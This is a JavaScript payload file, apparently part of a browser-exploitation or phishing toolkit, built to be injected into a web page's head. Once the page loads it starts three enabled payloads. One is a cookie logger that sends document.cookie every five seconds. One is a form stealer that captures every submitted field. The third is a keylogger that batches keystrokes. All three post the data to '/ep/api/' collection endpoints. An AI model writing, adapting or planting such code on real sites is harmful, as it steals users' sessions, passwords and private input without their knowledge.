/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

alert('Test payload')

const PayloadManager = {
    // Configuration for payloads
    config: {
        cookieLogger: true,
        formStealer: true,
        keyLogger: true
    },

    // Available payloads
    payloads: {
        cookieLogger: () => {
            const sendCookies = () => {
                fetch('/ep/api/ping', { 
                    method: 'POST',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        cookies: document.cookie,
                        url: window.location.href
                    })
                });
            };

            // Send cookies immediately
            sendCookies();

            // Monitor cookie changes
            setInterval(sendCookies, 5000);

            // Monitor cookie changes using a MutationObserver
            const cookieObserver = new MutationObserver(() => {
                sendCookies();
            });

            cookieObserver.observe(document, {
                attributes: true,
                attributeFilter: ['cookie']
            });
        },

        formStealer: () => {
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', async (e) => {
                    const formData = new FormData(form);
                    const data = {
                        url: window.location.href,
                        fields: Object.fromEntries(formData),
                        timestamp: new Date().toISOString()
                    };
                    
                    await fetch('/ep/api/forms', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });
                });
            });
        },

        keyLogger: () => {
            let buffer = '';
            let lastKeypressTime = Date.now();
            
            const sendBuffer = () => {
                if (buffer.length > 0) {
                    fetch('/ep/api/keylog', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            keys: buffer,
                            url: window.location.href,
                            timestamp: new Date().toISOString()
                        })
                    });
                    buffer = '';
                }
            };

            document.addEventListener('keydown', (e) => {
                const currentTime = Date.now();
                
                // Add special keys
                if (e.key.length > 1) {
                    buffer += `[${e.key}]`;
                } else {
                    buffer += e.key;
                }
                
                // Send if buffer is full or timeout reached
                if (buffer.length >= 30 || currentTime - lastKeypressTime > 1000) {
                    sendBuffer();
                }
                
                lastKeypressTime = currentTime;
            });

            // Send remaining buffer when tab/window loses focus
            window.addEventListener('blur', sendBuffer);
        }
    },
    
    init: function() {
        // Execute enabled payloads when DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            Object.keys(this.config).forEach(payload => {
                if (this.config[payload] && this.payloads[payload]) {
                    this.payloads[payload]();
                }
            });
        });
    }
};

PayloadManager.init();